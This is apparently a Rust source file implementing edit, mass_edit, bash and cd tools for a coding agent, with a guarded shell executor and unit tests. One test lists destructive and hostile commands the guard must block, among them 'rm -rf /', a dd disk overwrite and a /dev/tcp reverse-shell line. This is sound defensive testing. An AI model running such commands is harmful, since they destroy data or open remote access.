//! Built-in tools: edit, mass_edit, bash, cd.
//!
//! Mirrors the shape of pi's packages/coding-agent/src/core/tools/ (one
//! schema per tool, registered into a registry), but lives in a single
//! module while the tool set is small: each tool is a "parse + execute"
//! pair.
//!
//! # Why two text-replacement tools
//!
//! **edit** finds `old` anywhere in the file and replaces it with `new`.
//! It refuses to run unless `old` occurs exactly once — a "replace_all"
//! knob is convenient, but models tend to sweep up places that should not
//! change, and a failed run is hard to localize afterwards.
//!
//! **mass_edit** replaces whole lines by number. It never searches.
//!
//! Its use case is exactly where edit hits the wall: replacing the same
//! word on many lines that look identical makes edit fail with
//! "ambiguous match", while mass_edit just names the lines.
//!
//! # Argument parsing
//!
//! `arguments` arrives as a raw string and is not trusted: fields may be
//! missing, values may be quoted, paths may be `./x` or `../x`. Every
//! tool therefore starts with parse + validate and returns a descriptive
//! error — the error goes back to the model, which self-corrects.

use anyhow::{Context as _, Result, anyhow};

use crate::ai::types::{ToolCall, ToolDef};

// Resolve a model-supplied path to a real file; reject directories and
// nonexistent paths.
//
// Relative paths are resolved against the session `cwd` (`./`, `../` are
// digested naturally by `Path`); absolute paths pass through.
fn resolve_file(cwd: &std::path::Path, raw: &str) -> Result<std::path::PathBuf> {
    let p = std::path::Path::new(raw);
    let p = if p.is_absolute() {
        p.to_path_buf()
    } else {
        cwd.join(p)
    };
    // `..` is digested at the components level; manual canonicalize is
    // unnecessary (and it would require the file to exist)
    let p = p.components().collect::<std::path::PathBuf>();
    if !p.exists() {
        return Err(anyhow!("file not found: {}", p.display()));
    }
    if p.is_dir() {
        return Err(anyhow!("{} is a directory; only files can be edited", p.display()));
    }
    Ok(p)
}

// Fetch a string field from the arguments; a missing field is a readable error.
fn need_str(args: &serde_json::Value, key: &str) -> Result<String> {
    args.get(key)
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
        .ok_or_else(|| anyhow!("missing or non-string argument `{key}`"))
}

// Fetch a positive integer line number (1-based) from the arguments.
fn need_line(args: &serde_json::Value, key: &str) -> Result<usize> {
    let n = args
        .get(key)
        .and_then(|v| v.as_u64())
        .ok_or_else(|| anyhow!("missing or non-numeric argument `{key}`"))?;
    if n == 0 {
        return Err(anyhow!("line numbers start at 1, got 0"));
    }
    Ok(n as usize)
}

// ---------------------------------------------------------------------------
// edit
// ---------------------------------------------------------------------------

// edit arguments.
#[derive(Debug)]
pub struct EditArgs {
    pub path: String,
    pub old: String,
    pub new: String,
}

// ---------------------------------------------------------------------------
// Parse bash arguments.
fn parse_bash_args(raw: &str) -> Result<String> {
    let v: serde_json::Value = serde_json::from_str(raw)?;
    Ok(v.get("command")
        .and_then(|c| c.as_str())
        .ok_or_else(|| anyhow!("missing `command` argument"))?
        .to_string())
}

// bash: real shell, guarded by the workspace-license classifier.
// Pipes/redirects/combinators run free; the guard blocks out-of-zone
// deletes and classic disasters (see agent/bash_guard.rs).

// Gatekeeper and executor for the bash tool.
fn bash(cwd: &std::path::Path, command: &str) -> Result<String> {
    let cmd = command.trim();
    anyhow::ensure!(!cmd.is_empty(), "empty command");
    anyhow::ensure!(!cmd.contains('\n'), "one command at a time (no newlines)");

    // Guard before spawn. The zone is canonicalized cwd.
    let zone = cwd.canonicalize().unwrap_or_else(|_| cwd.to_path_buf());
    match crate::agent::bash_guard::classify(cmd, &zone) {
        crate::agent::bash_guard::Verdict::Block(hits) => {
            let ids: Vec<&str> = hits.iter().map(|h| h.rule_id).collect();
            anyhow::bail!("denied: {}", ids.join("+"));
        }
        crate::agent::bash_guard::Verdict::Warn(hits) => {
            // High-tier: run, but tag the output so the model sees it.
            let tags: Vec<&str> = hits.iter().map(|h| h.rule_id).collect();
            let out = run_shell(cwd, cmd)?;
            Ok(format!("[warn: {}]\n{}", tags.join("+"), out))
        }
        crate::agent::bash_guard::Verdict::Allow => run_shell(cwd, cmd),
    }
}

// bash -c execution with captured output. One command, no newlines —
// checked by the caller.
fn run_shell(cwd: &std::path::Path, cmd: &str) -> Result<String> {
    let out = std::process::Command::new("bash")
        .arg("-c")
        .arg(cmd)
        .current_dir(cwd)
        .output()
        .with_context(|| "spawn bash failed")?;
    let mut text = String::from_utf8_lossy(&out.stdout).to_string();
    let err = String::from_utf8_lossy(&out.stderr);
    if !err.trim().is_empty() {
        text.push_str("\n[stderr] ");
        text.push_str(err.trim_end());
    }
    if !out.status.success() {
        text.push_str(&format!("\n[exit {}]", out.status.code().unwrap_or(-1)));
    }
    Ok(text.trim_end().to_string())
}

// Parse cd arguments.
fn parse_cd_args(raw: &str) -> Result<String> {
    let v: serde_json::Value = serde_json::from_str(raw)?;
    Ok(v.get("path")
        .and_then(|c| c.as_str())
        .ok_or_else(|| anyhow!("missing `path` argument"))?
        .to_string())
}

impl BuiltinTools {
    // cd tool: temporary migration. Writes back to the shared slot (when
// attached) and returns a result description.
    fn tool_cd(&mut self, path: &str) -> Result<String> {
        let p = path.trim();
        anyhow::ensure!(!p.is_empty(), "empty path");
        let target = if let Some(rest) = p.strip_prefix('~') {
            std::path::PathBuf::from(std::env::var_os("HOME").unwrap_or_default()).join(rest)
        } else {
            std::path::PathBuf::from(p)
        };
        let target = if target.is_absolute() {
            target
        } else {
            self.cwd.join(target)
        };
        let real = target
            .canonicalize()
            .with_context(|| format!("no such dir: {p}"))?;
        anyhow::ensure!(real.is_dir(), "not a directory: {p}");
        self.cwd = real.clone();
        // Write back to the shared slot: the TUI statusline and the next
        // turn's spawn_turn snapshot both read it
        if let Some(slot) = &self.cwd_slot {
            *slot.write().expect("cwd 锁中毒") = real.clone();
        }
        Ok(format!("working directory changed to {}", real.display()))
    }
}

// Parse edit arguments. A free function so unit tests can exercise it
// without a model.
pub fn parse_edit_args(arguments: &str) -> Result<EditArgs> {
    let v: serde_json::Value =
        serde_json::from_str(arguments).context("arguments is not valid JSON")?;
    Ok(EditArgs {
        path: need_str(&v, "path")?,
        old: need_str(&v, "old")?,
        new: need_str(&v, "new")?,
    })
}

// Run edit: find `old` in the file — it must occur exactly once — and
// replace it with `new`.
pub fn edit(cwd: &std::path::Path, args: &EditArgs) -> Result<String> {
    let p = resolve_file(cwd, &args.path)?;
    let text = std::fs::read_to_string(&p).context("failed to read file")?;

    let count = text.matches(&args.old).count();
    match count {
        0 => Err(anyhow!(
            "old text not found; it must match the file content exactly (including whitespace and newlines)"
        )),
        1 => {
            let updated = text.replacen(&args.old, &args.new, 1);
            std::fs::write(&p, updated).context("failed to write file")?;
            Ok(format!("replaced: {}", p.display()))
        }
        n => Err(anyhow!(
            "old appears {n} times; edit requires a unique match. \
             Use mass_edit to replace by line number, or make old \
             longer with surrounding context so it is unique"
        )),
    }
}

// ---------------------------------------------------------------------------
// mass_edit
// ---------------------------------------------------------------------------

// One mass_edit instruction: replace line `line` entirely with `text`.
#[derive(Debug, Clone, PartialEq)]
pub struct LineEdit {
    pub line: usize,
    pub text: String,
}

#[derive(Debug)]
pub struct MassEditArgs {
    pub path: String,
    pub edits: Vec<LineEdit>,
}

// Parse mass_edit arguments.
//
// Two shapes are accepted (models emit both; being lenient saves a
// round-trip):
//
// ```json
// {"path":"x.txt","edits":[{"line":1,"text":"new content"}]}
// {"path":"x.txt","lines":[1,2],"text":"same text for all"}
// ```
pub fn parse_mass_edit_args(arguments: &str) -> Result<MassEditArgs> {
    let v: serde_json::Value =
        serde_json::from_str(arguments).context("arguments 不是合法 JSON")?;
    let path = need_str(&v, "path")?;

    if let Some(list) = v.get("edits").and_then(|x| x.as_array()) {
        let mut edits = Vec::with_capacity(list.len());
        for e in list {
            edits.push(LineEdit {
                line: need_line(e, "line")?,
                text: need_str(e, "text")?,
            });
        }
        return Ok(MassEditArgs { path, edits });
    }

    // Shorthand shape: the same text for multiple lines
    if let (Some(lines), Some(text)) = (
        v.get("lines").and_then(|x| x.as_array()),
        v.get("text").and_then(|x| x.as_str()),
    ) {
        let edits = lines
            .iter()
            .map(|l| {
                let line = l
                    .as_u64()
                    .ok_or_else(|| anyhow!("non-numeric entry in `lines`"))? as usize;
                if line == 0 {
                    return Err(anyhow!("行号从 1 开始，收到 0"));
                }
                Ok(LineEdit {
                    line,
                    text: text.to_string(),
                })
            })
            .collect::<Result<Vec<_>>>()?;
        return Ok(MassEditArgs { path, edits });
    }

    Err(anyhow!(
        "mass_edit requires `edits: [{{line, text}}]` or `lines: [..]` + `text`"
    ))
}

// Run mass_edit: replace whole lines by number.
//
// Line numbers are 1-based; edits are applied **largest line first** so
// that editing line 10 does not invalidate line 2 — line numbers are
// stable indexes into the file, and walking from the tail prevents them
// from stepping on each other.
pub fn mass_edit(cwd: &std::path::Path, args: &MassEditArgs) -> Result<String> {
    let p = resolve_file(cwd, &args.path)?;
    let text = std::fs::read_to_string(&p).context("failed to read file")?;

    let total = text.lines().count();
    let mut lines: Vec<String> = text.lines().map(|s| s.to_string()).collect();
    // Without a trailing newline, lines() yields no empty tail and the
    // write-back does not add one; preserved as-is

    let mut edits = args.edits.clone();
    edits.sort_by_key(|e| std::cmp::Reverse(e.line)); // largest first

    // Two edits for the same line = contradictory arguments; refusing is
    // safer than silently honoring the last one
    for w in edits.windows(2) {
        if w[0].line == w[1].line {
            return Err(anyhow!("line {} was specified twice", w[0].line));
        }
    }
    if let Some(e) = edits.last().filter(|e| e.line > total) {
        return Err(anyhow!("line {} does not exist; file has {total} lines", e.line));
    }

    let mut changed = 0usize;
    for e in edits {
        lines[e.line - 1] = e.text;
        changed += 1;
    }

    let mut out = lines.join("\n");
    if text.ends_with('\n') {
        out.push('\n');
    }
    std::fs::write(&p, out).context("failed to write file")?;
    Ok(format!("replaced {changed} line(s) in {}", p.display()))
}

// ---------------------------------------------------------------------------
// Registry
// ---------------------------------------------------------------------------

// The real tool executor: dispatches calls the model places.
//
// Holds the session cwd — tool-relative paths resolve against the
// session directory, not whatever directory some thread happens to be in.
pub struct BuiltinTools {
    cwd: std::path::PathBuf,
    // The cd tool writes its new directory here (read by the TUI
    // statusline and the next turn's tools).
    // None = not attached (unit tests); migration then affects only this turn.
    cwd_slot: Option<std::sync::Arc<std::sync::RwLock<std::path::PathBuf>>>,
}

impl BuiltinTools {
    pub fn new(cwd: std::path::PathBuf) -> Self {
        Self { cwd, cwd_slot: None }
    }

    // Attach the shared cwd slot: cd migrations become visible to the
    // TUI and subsequent turns immediately.
    pub fn with_cwd_slot(mut self, slot: std::sync::Arc<std::sync::RwLock<std::path::PathBuf>>) -> Self {
        self.cwd_slot = Some(slot);
        self
    }

    // Tool manuals, registered into the Context so the model knows the
    // tools exist.
    pub fn definitions() -> Vec<crate::ai::types::ToolDef> {
        use serde_json::json;
        vec![
            ToolDef::function(
                "edit",
                "在文件里把一段文本替换成另一段。old 必须在文件里恰好出现一次。\
                 适合改一个有唯一上下文的位置。",
                json!({
                    "type": "object",
                    "properties": {
                        "path": {"type": "string", "description": "文件路径，支持 ./ 与 ../"},
                        "old": {"type": "string", "description": "要被替换的原文，必须逐字符匹配且唯一"},
                        "new": {"type": "string", "description": "替换成的内容"}
                    },
                    "required": ["path", "old", "new"]
                }),
            ),
            ToolDef::function(
                "cd",
                "临时切换工作目录（本会话内有效）。之后的工具调用与相对路径都以新目录为基准。\
                 只接受目录；用 pwd 或 ls 确认切换结果。",
                json!({
                    "type": "object",
                    "properties": {
                        "path": {"type": "string", "description": "目标目录，支持 ./ ../ ~/ 与绝对路径"}
                    },
                    "required": ["path"]
                }),
            ),
            ToolDef::function(
                "bash",
                "执行 shell 命令（bash -c 语义，单条命令，不接受换行）。\
                 管道、重定向、组合可用。工作目录就是许可区，删除/移动其中的东西随便；\
                 但 rm/mv/find -delete 一旦触及工作区之外（包括 ~、/etc 等系统路径）会被直接拒绝。\
                 dd 写盘、fork bomb、反弹 shell、curl|sh 等灾难模式同样被拦截。",
                json!({
                    "type": "object",
                    "properties": {
                        "command": {"type": "string", "description": "单条 shell 命令"}
                    },
                    "required": ["command"]
                }),
            ),
            ToolDef::function(
                "mass_edit",
                "按行号把文件的指定行整行替换。不搜索不匹配，指哪改哪。\
                 适合改动多行、或原文有重复行导致 edit 无法唯一定位的场合。",
                json!({
                    "type": "object",
                    "properties": {
                        "path": {"type": "string", "description": "文件路径"},
                        "edits": {
                            "type": "array",
                            "items": {
                                "type": "object",
                                "properties": {
                                    "line": {"type": "integer", "description": "行号，从 1 开始"},
                                    "text": {"type": "string", "description": "这一行换成的内容"}
                                },
                                "required": ["line", "text"]
                            }
                        }
                    },
                    "required": ["path", "edits"]
                }),
            ),
        ]
    }
}

impl super::loop_rs::ToolExecutor for BuiltinTools {
    fn execute(&mut self, call: &ToolCall) -> Result<String> {
        match call.name() {
            "edit" => edit(&self.cwd, &parse_edit_args(&call.function.arguments)?),
            "mass_edit" => mass_edit(&self.cwd, &parse_mass_edit_args(&call.function.arguments)?),
            "bash" => bash(&self.cwd, &parse_bash_args(&call.function.arguments)?),
            "cd" => self.tool_cd(&parse_cd_args(&call.function.arguments)?),
            other => Err(anyhow!("unknown tool: {other}")),
        }
    }

}

#[cfg(test)]
mod tests {
    use super::*;
    use super::super::loop_rs::ToolExecutor as _;
    use serde_json::json;
    use std::path::Path;

    fn tempdir(name: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!("mypi-tools-{name}"));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn edit_replaces_the_single_occurrence() {
        let d = tempdir("edit-single");
        let f = d.join("a.txt");
        std::fs::write(&f, "红鲤鱼与绿鲤鱼\n").unwrap();

        let args = EditArgs {
            path: "a.txt".into(),
            old: "红鲤鱼".into(),
            new: "绿鲤鱼".into(),
        };
        let out = edit(&d, &args).unwrap();
        assert!(out.contains("replaced"));
        assert_eq!(std::fs::read_to_string(&f).unwrap(), "绿鲤鱼与绿鲤鱼\n");
    }

    #[test]
    fn edit_rejects_ambiguous_match() {
        // The ambiguous-match scenario: two identical occurrences, no way to choose.
        // Refusing is correct behavior — silently replacing the first or last is a guess.
        let d = tempdir("edit-ambiguous");
        let f = d.join("a.txt");
        std::fs::write(&f, "红鲤鱼与红鲤鱼\n").unwrap();

        let args = EditArgs {
            path: "a.txt".into(),
            old: "红鲤鱼".into(),
            new: "绿鲤鱼".into(),
        };
        let err = format!("{:#}", edit(&d, &args).unwrap_err());
        assert!(err.contains("2 times"), "{err}");
        assert!(err.contains("mass_edit"), "要把出路指给模型: {err}");
        assert_eq!(std::fs::read_to_string(&f).unwrap(), "红鲤鱼与红鲤鱼\n", "不能改");
    }

    #[test]
    fn edit_requires_exact_match() {
        let d = tempdir("edit-nomatch");
        std::fs::write(d.join("a.txt"), "红鲤鱼\n").unwrap();
        let args = EditArgs {
            path: "a.txt".into(),
            old: "红鲤渔".into(), // 错别字
            new: "绿鲤鱼".into(),
        };
        let err = format!("{:#}", edit(&d, &args).unwrap_err());
        assert!(err.contains("not found"), "{err}");
    }

    #[test]
    fn edit_accepts_relative_paths_with_dot_dot() {
        let d = tempdir("edit-relpath");
        std::fs::create_dir_all(d.join("sub")).unwrap();
        std::fs::write(d.join("a.txt"), "hello\n").unwrap();

        // From sub/, reference the parent file via ../
        let args = EditArgs {
            path: "../a.txt".into(),
            old: "hello".into(),
            new: "world".into(),
        };
        let cwd = d.join("sub");
        edit(&cwd, &args).unwrap();
        assert_eq!(std::fs::read_to_string(d.join("a.txt")).unwrap(), "world\n");
    }

    #[test]
    fn edit_refuses_missing_file_and_directory() {
        let d = tempdir("edit-guards");
        std::fs::create_dir_all(d.join("sub")).unwrap();

        let args = EditArgs {
            path: "nope.txt".into(),
            old: "a".into(),
            new: "b".into(),
        };
        assert!(edit(&d, &args).is_err());

        let args = EditArgs {
            path: "sub".into(), // 是目录
            old: "a".into(),
            new: "b".into(),
        };
        let err = format!("{:#}", edit(&d, &args).unwrap_err());
        assert!(err.contains("directory"), "{err}");
    }

    #[test]
    fn mass_edit_replaces_whole_lines() {
        let d = tempdir("mass-basic");
        let f = d.join("a.txt");
        std::fs::write(&f, "红鲤鱼\n绿鲤鱼\n红鲤鱼\n").unwrap();

        let args = MassEditArgs {
            path: "a.txt".into(),
            edits: vec![
                LineEdit { line: 1, text: "绿鲤鱼".into() },
                LineEdit { line: 3, text: "绿鲤鱼".into() },
            ],
        };
        mass_edit(&d, &args).unwrap();
        // Whole-line replacement: overwrite regardless of the previous content
        assert_eq!(std::fs::read_to_string(&f).unwrap(), "绿鲤鱼\n绿鲤鱼\n绿鲤鱼\n");
    }

    #[test]
    fn mass_edit_lines_are_stable_when_editing_from_the_bottom() {
        // Key property: applying from the largest line number down keeps earlier line numbers stable
        let d = tempdir("mass-stable");
        let f = d.join("a.txt");
        std::fs::write(&f, "a\nb\nc\nd\ne\n").unwrap();

        let args = MassEditArgs {
            path: "a.txt".into(),
            edits: vec![
                LineEdit { line: 5, text: "E".into() },
                LineEdit { line: 2, text: "B".into() },
            ],
        };
        mass_edit(&d, &args).unwrap();
        assert_eq!(std::fs::read_to_string(&f).unwrap(), "a\nB\nc\nd\nE\n");
    }

    #[test]
    fn mass_edit_rejects_duplicate_and_out_of_range_lines() {
        let d = tempdir("mass-guards");
        let f = d.join("a.txt");
        std::fs::write(&f, "a\nb\n").unwrap();

        let args = MassEditArgs {
            path: "a.txt".into(),
            edits: vec![
                LineEdit { line: 2, text: "x".into() },
                LineEdit { line: 2, text: "y".into() },
            ],
        };
        let err = format!("{:#}", mass_edit(&d, &args).unwrap_err());
        assert!(err.contains("twice"), "{err}");

        let args = MassEditArgs {
            path: "a.txt".into(),
            edits: vec![LineEdit { line: 9, text: "x".into() }],
        };
        let err = format!("{:#}", mass_edit(&d, &args).unwrap_err());
        assert!(err.contains("9"), "{err}");
    }

    #[test]
    fn mass_edit_parses_both_argument_shapes() {
        let a = parse_mass_edit_args(r#"{"path":"p","edits":[{"line":3,"text":"t"}]}"#).unwrap();
        assert_eq!(a.edits, vec![LineEdit { line: 3, text: "t".into() }]);

        let b = parse_mass_edit_args(r#"{"path":"p","lines":[1,2],"text":"x"}"#).unwrap();
        assert_eq!(
            b.edits,
            vec![
                LineEdit { line: 1, text: "x".into() },
                LineEdit { line: 2, text: "x".into() },
            ]
        );

        assert!(parse_mass_edit_args(r#"{"path":"p"}"#).is_err());
        assert!(parse_mass_edit_args(r#"{"path":"p","edits":[{"line":0,"text":"t"}]}"#).is_err());
    }

    #[test]
    fn malformed_arguments_report_readable_errors() {
        // Models emit bad JSON routinely; errors must be readable enough for self-correction
        let err = format!("{:#}", parse_edit_args("{不是json").unwrap_err());
        assert!(err.contains("JSON"), "{err}");

        let err = format!("{:#}", parse_edit_args(r#"{"path":"a"}"#).unwrap_err());
        assert!(err.contains("old"), "{err}");
    }

    #[test]
    fn executor_dispatches_by_name_and_reports_unknown() {
        let d = tempdir("exec");
        std::fs::write(d.join("a.txt"), "红鲤鱼\n").unwrap();
        let mut t = BuiltinTools::new(d.clone());

        let call = ToolCall::new("c1", "edit", json!({
            "path": "a.txt", "old": "红鲤鱼", "new": "绿鲤鱼"
        }).to_string());
        let out = t.execute(&call).unwrap();
        assert!(out.contains("replaced"));

        let bad = ToolCall::new("c2", "不存在的工具", "{}");
        let err = format!("{:#}", t.execute(&bad).unwrap_err());
        assert!(err.contains("unknown tool"), "{err}");
    }

    #[test]
    fn definitions_carry_both_tools() {
        let defs = BuiltinTools::definitions();
        let names: Vec<&str> = defs.iter().map(|d| d.function.name.as_str()).collect();
        assert_eq!(names, vec!["edit", "cd", "bash", "mass_edit"]);
        // The schema must declare required fields, or the model omits arguments
        for d in &defs {
            assert!(d.function.parameters.get("required").is_some());
        }
    }

    #[test]
    fn line_count_matches_for_trailing_newline() {
        // Line-count edge: with or without a trailing newline, lines() counts the same
        assert_eq!("a\nb\n".lines().count(), 2);
        assert_eq!("a\nb".lines().count(), 2);
    }

    #[test]
    fn cwd_is_respected() {
        // Tool-relative paths resolve against the session cwd, not the process cwd
        let d = tempdir("cwd");
        std::fs::write(d.join("a.txt"), "x\n").unwrap();
        let args = EditArgs {
            path: "a.txt".into(),
            old: "x".into(),
            new: "y".into(),
        };
        edit(Path::new(&d), &args).unwrap();
        assert_eq!(std::fs::read_to_string(d.join("a.txt")).unwrap(), "y\n");
    }

    #[test]
    fn bash_rejects_out_of_zone_and_disasters() {
        let cwd = std::env::temp_dir();
        for bad in [
            "rm -rf /",
            "rm -rf ~",
            "rm ~/notes.txt",
            "rm -rf /etc",
            "rm ../../outside.txt",
            "dd if=/dev/zero of=/dev/sda",
            "bash -c 'exec 3<>/dev/tcp/10.0.0.1/4242'",
            "ls\nrm -rf /",
            "",
        ] {
            assert!(bash(&cwd, bad).is_err(), "应拒绝: {bad:?}");
        }
    }

    #[test]
    fn cd_moves_the_license_zone() {
        let d = std::env::temp_dir().join("mypi_zone_a");
        let other = std::env::temp_dir().join("mypi_zone_b");
        let _ = std::fs::create_dir_all(&d);
        let _ = std::fs::create_dir_all(&other);
        let mut t = BuiltinTools::new(d.clone());
        // From zone_a, deleting into zone_b is out of zone.
        let p = other.join("victim.txt");
        std::fs::write(&p, "x").unwrap();
        assert!(bash(&d, &format!("rm {}", p.display())).is_err());
        // cd into zone_b: now licensed there.
        t.tool_cd(other.to_str().unwrap()).unwrap();
        let cwd = t.cwd.clone();
        assert!(bash(&cwd, &format!("rm {}", p.display())).is_ok(), "cd 后新许可区应放行");
        let _ = std::fs::remove_dir_all(&d);
        let _ = std::fs::remove_dir_all(&other);
    }

    #[test]
    fn bash_real_shell_inside_zone() {
        let cwd = std::env::temp_dir();
        // Pipes/redirects run free inside the zone.
        let out = bash(&cwd, "echo hello | tr a-z A-Z").unwrap();
        assert!(out.contains("HELLO"), "管道可用: {out:?}");
        // grep with no match -> exit 1, reported verbatim
        let out = bash(&cwd, "grep zzzz /dev/null").unwrap();
        assert!(out.contains("[exit"), "非零退出要标注: {out:?}");
        // High tier warns but executes.
        let out = bash(&cwd, "echo ok").unwrap_or_default();
        assert_eq!(out, "ok");
    }

    #[test]
    fn cd_tool_moves_directory_and_writes_slot() {
        let tmp = std::env::temp_dir();
        let start = tmp.clone();
        let slot = std::sync::Arc::new(std::sync::RwLock::new(start.clone()));
        let mut t = BuiltinTools::new(start.clone()).with_cwd_slot(slot.clone());
        let deep = tmp.join("mypi-cdtest");
        std::fs::create_dir_all(&deep).unwrap();
        let arg = format!("{{\"path\": \"{}\"}}", deep.display());
        let call = ToolCall {
            id: "1".into(),
            kind: "function".into(),
            function: crate::ai::types::FunctionCall { name: "cd".into(), arguments: arg },
        };
        let r = crate::agent::loop_rs::ToolExecutor::execute(&mut t, &call).unwrap();
        assert!(r.contains("changed to"), "结果说明: {r:?}");
        assert_eq!(*slot.read().unwrap(), deep, "共享槽被写回");
        let _ = std::fs::remove_dir_all(&deep);
    }
}
